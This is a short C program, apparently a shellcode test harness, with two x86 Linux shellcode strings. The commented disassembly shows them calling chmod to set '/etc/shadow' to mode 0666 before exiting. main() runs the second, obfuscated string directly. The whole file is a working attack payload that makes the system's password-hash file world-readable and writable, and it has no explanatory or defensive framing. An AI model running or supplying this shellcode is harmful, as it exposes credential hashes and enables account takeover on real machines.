#include <stdio.h>
int main()
{
 
    char shellcode1[] =
            "\x31\xc0"          // xor eax,eax
            "\x50"              // push eax
            "\x68\x61\x64\x6f\x77"      // push dword 0x776f6461
            "\x68\x2f\x2f\x73\x68"      // push dword 0x68732f2f
            "\x68\x2f\x65\x74\x63"      // push dword 0x6374652f
            "\x89\xe3"          // mov ebx,esp
            "\x66\x68\xb6\x01"  // push word 0x1b6
            "\x59"              // pop ecx
            "\xb0\x0f"          // mov al,0xf
            "\xcd\x80"          // int 0x80
            "\xb0\x01"          // mov al,0x1
            "\xcd\x80";         // int 0x80
 
char shellcode[] =
"\x31\xc9\xf7\xe1\x52\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73\x68\x68\x74\x63\x2f\x2f\x68\x2f\x2f\x2f\x65\x89\xe3\x66\x68\xb7\x01\x59\x83\xe9\x01\xb0\x0f\xcd\x80\xb0\x01\xcd\x80";

    printf("[*] ShellCode size (bytes): %d\n\n", sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();
     
    return 0;
}


